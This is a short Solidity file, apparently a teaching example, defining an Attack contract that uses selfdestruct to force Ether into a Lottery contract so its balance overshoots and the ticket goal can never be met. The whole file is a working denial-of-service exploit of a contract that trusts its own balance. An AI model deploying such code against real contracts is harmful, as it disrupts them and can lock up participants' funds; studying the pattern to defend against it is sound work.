// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Attack {
    Lottery lottery;

    constructor(Lottery _lottery) {
        lottery = Lottery(_lottery);
    }

    function attack() public payable {
        // This attack will add Ether to the lottery, disrupting the ticket sales.
        // Since it pushes the balance higher, the lottery cannot reach its ticket goal.
        
        require(msg.value > 0, "Must send Ether to attack");
        address payable addr = payable(address(lottery));
        selfdestruct(addr);
    }
}